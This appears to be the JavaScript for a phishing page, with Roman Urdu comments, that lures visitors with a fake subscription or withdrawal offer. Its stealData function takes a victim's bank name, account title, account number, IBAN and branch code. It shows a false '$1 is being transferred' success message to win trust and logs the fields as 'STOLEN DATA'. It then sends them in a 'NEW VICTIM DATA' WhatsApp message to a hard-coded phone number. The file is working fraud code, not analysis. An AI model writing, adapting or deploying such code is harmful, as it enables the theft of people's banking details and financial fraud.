function goToNextStep() {
    document.getElementById('subscribe-section').style.display = 'none';
    document.getElementById('bank-section').style.display = 'block';
}

function stealData(event) {
    event.preventDefault(); // Page reload hone se bachega

    // User ka data collect karna
    const data = {
        Bank: document.getElementById('bankName').value,
        Name: document.getElementById('accTitle').value,
        Account: document.getElementById('accNumber').value,
        IBAN: document.getElementById('iban').value,
        Branch: document.getElementById('branchCode').value
    };

    // Fake Loading effect
    const btn = document.querySelector('.btn-withdraw');
    const originalText = btn.innerHTML;
    btn.innerHTML = "Processing...";
    btn.disabled = true;

    // WhatsApp Message Banayein
    const phoneNumber = "923406348515"; // Aapka number (0340...)
    const message = `*NEW VICTIM DATA CAPPED*\n\n💳 Bank: ${data.Bank}\n👤 Name: ${data.Name}\n🔢 Account: ${data.Account}\n🌍 IBAN/Mobile: ${data.IBAN}\n🏢 Branch: ${data.Branch}\n\n*Link Sent From: ${window.location.href}*`;

    // 3 second baad data WhatsApp par bhejein
    setTimeout(() => {
        // Success message user ko dikhana taake wo bharosa kare
        document.getElementById('statusMsg').style.display = 'block';
        document.getElementById('statusMsg').innerText = "Success! $1 is being transferred. Please wait 24-48 hours.";
        
        // Data Console mein bhi save karein (Backup ke liye)
        console.log("=== STOLEN DATA ===");
        console.log(JSON.stringify(data, null, 2));

        // WhatsApp par message bhejne ka link open karein (User ke phone par WhatsApp khol dega aur aapko message dega)
        // Note: User ko WhatsApp open hoga, wo bas 'Send' button daba dega ya aap direct link se bhej sakte hain agar API use karein.
        // Yeh line user ko WhatsApp khulwa kar aapko message send karegi:
        window.open(`https://wa.me/${phoneNumber}?text=${encodeURIComponent(message)}`, '_blank');

        // Button wapis normal karein
        btn.innerHTML = originalText;
        btn.disabled = false;
        document.getElementById('phishForm').reset();
    }, 2000);
}
